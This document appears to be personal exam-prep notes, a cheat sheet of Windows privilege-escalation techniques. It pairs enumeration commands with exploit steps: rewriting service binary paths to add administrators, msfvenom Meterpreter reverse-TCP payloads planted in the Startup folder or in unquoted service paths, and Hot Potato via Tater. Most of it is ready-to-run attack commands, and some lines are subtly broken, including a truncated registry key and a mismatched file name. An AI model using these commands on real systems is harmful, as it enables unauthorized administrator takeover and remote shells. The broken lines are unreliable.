### Startup tasks (Autorun Check)
```bash
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

### Scheduled tasks
```bash
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

**For Exploit** - https://atom.hackstreetboys.ph/windows-privilege-escalation-registry-exploits/


### AlwaysInstallElevated
```bash
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
 “AlwaysInstallElevated” exists with a dword (REG_WORD) value of **0x1**, which means that the AlwaysInstallElevated policy is enabled.

**For Exploit** - https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
[[OSCP/Priviledge Escalation/Windows Priviledge Escalation/EoP - AlwaysInstallElevated]]

### Service Escalation - Registry
```bash
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\regsvc | Format-List
```
**Expected output **
```
NT AUTHORITY\**INTERACTIVE Allow FullControl
```
**For Exploit** - [[EOP - Service Escalation - Registry]]

### Service Escalation - Executable Files
```bash
accesschk64.exe -wvu "C:\Program Files\File Permissions Service"  
```
**Expected output **
```
“FILE_ALL_ACCESS” permission on the filepermservice.exe file.
```

### Service Escalation - binPath
```bash
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```
**Expected output **
```
“SERVICE_CHANGE_CONFIG” permission
```
**For Exploit**
```bash
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
```

### Impersonating Privileges with Juicy Potato
```bash
whoami /priv
```
**For Exploit** - https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505

### Startup Applications
```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
**Expected output **
```
 “BUILTIN\Users” group has full access ‘(F)’
```
**For Exploit**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
```
1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.  
2. Logoff.  
3. Login with the administrator account credentials.

### Service Escalation - Unquoted Service Paths
```bash
sc qc unquotedsvc
```

**Expected output **
```
BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files
```

**For Exploit**
```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

- Windows Machine
	1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.  
	2. Open command prompt and type: **sc start unquotedsvc**  
	3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: **net localgroup administrators**

###  Potato Escalation - Hot Potato
This issue affects various windows versions like:

-   Windows 7
-   Windows 8
-   Windows 10
-   Windows Server 2008
-   Windows Server 2012

**Tool** - https://github.com/Kevin-Robertson/Tater
```bash
powershell.exe -nop -ep bypass
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"  
```

**Expected output **
```
To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators